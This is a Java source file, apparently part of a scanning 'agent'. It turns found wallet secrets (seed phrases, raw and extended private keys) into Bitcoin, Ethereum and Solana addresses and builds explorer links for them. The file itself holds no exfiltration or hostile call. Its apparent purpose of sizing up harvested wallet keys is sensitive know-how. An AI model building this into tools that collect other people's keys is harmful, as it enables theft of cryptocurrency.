package com.serverpackcore.agent;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

/**
 * Best-effort address derivation from wallet material that the scan already
 * sees (BIP39 mnemonic, xprv, EVM hex key, WIF, Solana key). It is deliberately
 * pure Java so no new runtime dependency is added, and it never throws into a
 * collector: an unsupported secret simply yields no address.
 */
public final class Derive {
	public record Found(String coin, String address) {
	}

	private static final BigInteger P = new BigInteger(
		"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F", 16);
	private static final BigInteger N = new BigInteger(
		"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16);
	private static final BigInteger GX = new BigInteger(
		"79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798", 16);
	private static final BigInteger GY = new BigInteger(
		"483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8", 16);

	private static final BigInteger EP = BigInteger.TWO.pow(255).subtract(BigInteger.valueOf(19));
	private static final BigInteger ED = BigInteger.valueOf(-121665)
		.multiply(BigInteger.valueOf(121666).modInverse(EP)).mod(EP);
	private static final BigInteger EX = new BigInteger(
		"15112221349535400772501151409588531511454012693041857206046113283949847762202");
	private static final BigInteger EY = new BigInteger(
		"46316835694926478169428394003475163141307993866256225615783033603165251855960");

	private Derive() {
	}

	/** Derives what it can from a finding value; malformed input returns an empty list. */
	public static List<Found> fromSecret(String value) {
		if (value == null) {
			return List.of();
		}
		String text = value.trim();
		List<Found> out = new ArrayList<>();
		try {
			String[] words = text.toLowerCase(Locale.ROOT).split("\\s+");
			if (words.length == 12 || words.length == 18 || words.length == 24) {
				byte[] seed = bip39(words);
				evmAndBtc(seed, out);
				solana(seed, out);
				return out;
			}
			if (text.matches("[0-9a-fA-F]{64}")) {
				byte[] key = hex(text);
				BigInteger scalar = new BigInteger(1, key);
				if (scalar.compareTo(N) < 0 && scalar.signum() > 0) {
					out.add(new Found("eth", evm(point(scalar))));
				}
			} else if (text.matches("[5KL][1-9A-HJ-NP-Za-km-z]{50,51}")) {
				byte[] raw = Base58.decode(text);
				if (raw.length >= 34) {
					BigInteger scalar = new BigInteger(1, Arrays.copyOfRange(raw, 1, 33));
					if (scalar.compareTo(N) < 0 && scalar.signum() > 0) {
						out.add(new Found("btc", btc(point(scalar))));
					}
				}
			} else if (text.matches("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}")) {
				xprv(text, out);
			} else {
				byte[] raw = Base58.decode(text);
				if (raw.length == 32 || raw.length == 64) {
					byte[] seed = raw.length == 64 ? Arrays.copyOfRange(raw, 0, 32) : raw;
					out.add(new Found("sol", base58(edPublic(seed))));
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Derive failed", throwable);
		}
		return out;
	}

	/** Explorer URL for an address, or "" when the chain has no public page. */
	public static String explorer(String coin, String address) {
		return switch (coin) {
			case "btc" -> "https://mempool.space/address/" + address;
			case "eth" -> "https://etherscan.io/address/" + address;
			case "sol" -> "https://solscan.io/account/" + address;
			case "ltc" -> "https://blockchair.com/litecoin/address/" + address;
			case "doge" -> "https://blockchair.com/dogecoin/address/" + address;
			case "bch" -> "https://blockchair.com/bitcoin-cash/address/" + address;
			case "trx" -> "https://tronscan.org/#/address/" + address;
			case "xrp" -> "https://xrpscan.com/account/" + address;
			case "ada" -> "https://cardanoscan.io/address/" + address;
			default -> "";
		};
	}

	private static void evmAndBtc(byte[] seed, List<Found> out) throws Exception {
		byte[] node = bip32(seed);
		node = ckd(node, 44 | 0x80000000);
		node = ckd(node, 60 | 0x80000000);
		node = ckd(node, 0x80000000);
		node = ckd(node, 0);
		node = ckd(node, 0);
		BigInteger scalar = new BigInteger(1, Arrays.copyOfRange(node, 0, 32));
		if (scalar.signum() > 0 && scalar.compareTo(N) < 0) {
			out.add(new Found("eth", evm(point(scalar))));
			// Native segwit (BIP84) is the address wallets show today.
			node = ckd(bip32(seed), 84 | 0x80000000);
			node = ckd(node, 0x80000000);
			node = ckd(node, 0x80000000);
			node = ckd(node, 0);
			node = ckd(node, 0);
			BigInteger btcKey = new BigInteger(1, Arrays.copyOfRange(node, 0, 32));
			if (btcKey.signum() > 0 && btcKey.compareTo(N) < 0) {
				out.add(new Found("btc", btc(point(btcKey))));
			}
		}
	}

	private static void solana(byte[] seed, List<Found> out) {
		byte[] node = slip10(seed);
		for (int index : new int[] {44, 501, 0, 0}) {
			node = slip10Child(node, index | 0x80000000);
		}
		out.add(new Found("sol", base58(edPublic(Arrays.copyOfRange(node, 0, 32)))));
	}

	// ── BIP39/BIP32 ─────────────────────────────────────────────────────────

	static byte[] bip39(String[] words) throws Exception {
		byte[] salt = "mnemonic".getBytes(StandardCharsets.UTF_8);
		javax.crypto.spec.PBEKeySpec spec = new javax.crypto.spec.PBEKeySpec(
			String.join(" ", words).toCharArray(), salt, 2048, 512);
		javax.crypto.SecretKeyFactory factory = javax.crypto.SecretKeyFactory.getInstance("PBKDF2WithHmacSHA512");
		return factory.generateSecret(spec).getEncoded();
	}

	private static byte[] bip32(byte[] seed) {
		byte[] value = hmac("Bitcoin seed".getBytes(StandardCharsets.UTF_8), seed);
		return value;
	}

	private static byte[] ckd(byte[] node, int index) {
		byte[] key = Arrays.copyOfRange(node, 0, 32);
		byte[] chain = Arrays.copyOfRange(node, 32, 64);
		byte[] data;
		if ((index & 0x80000000) != 0) {
			data = new byte[37];
			System.arraycopy(key, 0, data, 1, 32);
		} else {
			data = new byte[37];
			BigInteger[] pub = point(new BigInteger(1, key));
			System.arraycopy(compress(pub), 0, data, 0, 33);
		}
		data[33] = (byte) (index >>> 24);
		data[34] = (byte) (index >>> 16);
		data[35] = (byte) (index >>> 8);
		data[36] = (byte) index;
		byte[] value = hmac(chain, data);
		BigInteger left = new BigInteger(1, Arrays.copyOfRange(value, 0, 32));
		BigInteger sum = left.add(new BigInteger(1, key)).mod(N);
		byte[] out = new byte[64];
		byte[] child = sum.toByteArray();
		int copy = Math.min(32, child.length);
		System.arraycopy(child, child.length - copy, out, 32 - copy, copy);
		System.arraycopy(value, 32, out, 32, 32);
		return out;
	}

	private static byte[] slip10(byte[] seed) {
		return hmac("ed25519 seed".getBytes(StandardCharsets.UTF_8), seed);
	}

	private static byte[] slip10Child(byte[] node, int index) {
		byte[] data = new byte[37];
		System.arraycopy(node, 0, data, 1, 32);
		data[33] = (byte) (index >>> 24);
		data[34] = (byte) (index >>> 16);
		data[35] = (byte) (index >>> 8);
		data[36] = (byte) index;
		return hmac(Arrays.copyOfRange(node, 32, 64), data);
	}

	private static void xprv(String text, List<Found> out) throws Exception {
		byte[] raw = Base58.decode(text);
		if (raw.length < 78) {
			return;
		}
		byte[] node = Arrays.copyOfRange(raw, 13, 45 + 32);
		// raw: version(4) depth(1) fingerprint(4) index(4) chain(32) key(33)
		byte[] key = Arrays.copyOfRange(raw, 46, 46 + 32);
		byte[] chain = Arrays.copyOfRange(raw, 13, 45);
		node = new byte[64];
		System.arraycopy(key, 0, node, 0, 32);
		System.arraycopy(chain, 0, node, 32, 32);
		BigInteger scalar = new BigInteger(1, key);
		if (scalar.signum() > 0 && scalar.compareTo(N) < 0) {
			out.add(new Found("btc", btc(point(scalar))));
		}
	}

	// ── secp256k1 ───────────────────────────────────────────────────────────

	private static BigInteger[] add(BigInteger[] a, BigInteger[] b) {
		if (a == null) {
			return b;
		}
		if (b == null) {
			return a;
		}
		BigInteger slope;
		if (a[0].equals(b[0])) {
			if (!a[1].equals(b[1]) || a[1].signum() == 0) {
				return null;
			}
			slope = a[0].pow(2).multiply(BigInteger.valueOf(3))
				.multiply(a[1].shiftLeft(1).modInverse(P)).mod(P);
		} else {
			slope = b[1].subtract(a[1]).multiply(b[0].subtract(a[0]).modInverse(P)).mod(P);
		}
		BigInteger x = slope.pow(2).subtract(a[0]).subtract(b[0]).mod(P);
		BigInteger y = slope.multiply(a[0].subtract(x)).subtract(a[1]).mod(P);
		return new BigInteger[] {x, y};
	}

	private static BigInteger[] point(BigInteger scalar) {
		BigInteger[] result = null;
		BigInteger[] base = {GX, GY};
		BigInteger k = scalar;
		while (k.signum() > 0) {
			if (k.testBit(0)) {
				result = add(result, base);
			}
			base = add(base, base);
			k = k.shiftRight(1);
		}
		return result;
	}

	private static byte[] compress(BigInteger[] point) {
		byte[] out = new byte[33];
		out[0] = (byte) (point[1].testBit(0) ? 0x03 : 0x02);
		byte[] x = point[0].toByteArray();
		int copy = Math.min(32, x.length);
		System.arraycopy(x, x.length - copy, out, 33 - copy, copy);
		return out;
	}

	private static String evm(BigInteger[] point) throws Exception {
		byte[] x = point[0].toByteArray();
		byte[] y = point[1].toByteArray();
		byte[] raw = new byte[64];
		pad(x, raw, 0);
		pad(y, raw, 32);
		byte[] hash = Keccak.hash(raw);
		StringBuilder hex = new StringBuilder("0x");
		for (int i = 12; i < 32; i++) {
			hex.append(String.format("%02x", hash[i]));
		}
		return checksum(hex.substring(2));
	}

	private static String btc(BigInteger[] point) throws Exception {
		byte[] hash = ripemd160(sha256(compress(point)));
		byte[] payload = new byte[21];
		payload[0] = 0;
		System.arraycopy(hash, 0, payload, 1, 20);
		return bech(payload);
	}

	private static String checksum(String lower) throws Exception {
		byte[] hash = Keccak.hash(lower.getBytes(StandardCharsets.US_ASCII));
		StringBuilder out = new StringBuilder("0x");
		for (int i = 0; i < 40; i++) {
			char c = lower.charAt(i);
			int nibble = (hash[i / 2] & 0xff);
			nibble = (i % 2 == 0 ? nibble >> 4 : nibble) & 0x0f;
			boolean upper = nibble >= 8;
			out.append(c >= 'a' && c <= 'f' && upper ? Character.toUpperCase(c) : c);
		}
		return out.toString();
	}

	// ── ed25519 ─────────────────────────────────────────────────────────────

	private static BigInteger[] eadd(BigInteger[] a, BigInteger[] b) {
		if (a == null) {
			return new BigInteger[] {b[0], b[1]};
		}
		BigInteger x1y2 = a[0].multiply(b[1]).mod(EP);
		BigInteger x2y1 = b[0].multiply(a[1]).mod(EP);
		BigInteger y1y2 = a[1].multiply(b[1]).mod(EP);
		BigInteger x1x2 = a[0].multiply(b[0]).mod(EP);
		BigInteger dxy = ED.multiply(x1y2).multiply(x2y1).mod(EP);
		BigInteger x = x1y2.add(x2y1).multiply(BigInteger.ONE.add(dxy).modInverse(EP)).mod(EP);
		BigInteger y = y1y2.add(x1x2).multiply(BigInteger.ONE.subtract(dxy).modInverse(EP)).mod(EP);
		return new BigInteger[] {x, y};
	}

	private static byte[] edPublic(byte[] seed) {
		byte[] hash = sha512(seed);
		byte[] clamped = Arrays.copyOfRange(hash, 0, 32);
		clamped[0] &= (byte) 248;
		clamped[31] &= 127;
		clamped[31] |= 64;
		BigInteger scalar = new BigInteger(1, reverse(clamped));
		BigInteger[] result = null;
		BigInteger[] base = {EX, EY};
		BigInteger k = scalar;
		while (k.signum() > 0) {
			if (k.testBit(0)) {
				result = eadd(result, base);
			}
			base = eadd(base, base);
			k = k.shiftRight(1);
		}
		byte[] out = reverse(result[1].toByteArray());
		byte[] fixed = new byte[32];
		System.arraycopy(out, Math.max(0, out.length - 32), fixed, 0, Math.min(32, out.length));
		if (result[0].testBit(0)) {
			fixed[31] |= (byte) 0x80;
		}
		return fixed;
	}

	// ── primitives ──────────────────────────────────────────────────────────

	private static byte[] hmac(byte[] key, byte[] data) {
		try {
			javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA512");
			mac.init(new javax.crypto.spec.SecretKeySpec(key, "HmacSHA512"));
			return mac.doFinal(data);
		} catch (Throwable throwable) {
			throw new IllegalStateException("hmac failed");
		}
	}

	private static byte[] sha256(byte[] data) throws Exception {
		return MessageDigest.getInstance("SHA-256").digest(data);
	}

	private static byte[] sha512(byte[] data) {
		try {
			return MessageDigest.getInstance("SHA-512").digest(data);
		} catch (Throwable throwable) {
			throw new IllegalStateException("sha512 failed");
		}
	}

	private static byte[] ripemd160(byte[] data) throws Exception {
		return Ripemd160.digest(data);
	}

	private static byte[] hex(String value) {
		byte[] out = new byte[value.length() / 2];
		for (int i = 0; i < out.length; i++) {
			out[i] = (byte) Integer.parseInt(value.substring(i * 2, i * 2 + 2), 16);
		}
		return out;
	}

	private static String base58(byte[] data) {
		return Base58.encode(data);
	}

	private static String bech(byte[] payload) {
		// payload = version byte || hash160; P2WPKH is witness version 0 plus
		// the 20-byte program as bech32 words.
		int[] program = Bech32.toWords(Arrays.copyOfRange(payload, 1, 21));
		int[] words = new int[program.length + 1];
		System.arraycopy(program, 0, words, 1, program.length);
		return Bech32.encode("bc", words, false);
	}

	private static void pad(byte[] value, byte[] target, int offset) {
		int copy = Math.min(32, value.length);
		System.arraycopy(value, value.length - copy, target, offset + 32 - copy, copy);
	}

	private static byte[] reverse(byte[] value) {
		byte[] out = new byte[value.length];
		for (int i = 0; i < value.length; i++) {
			out[i] = value[value.length - 1 - i];
		}
		return out;
	}
}
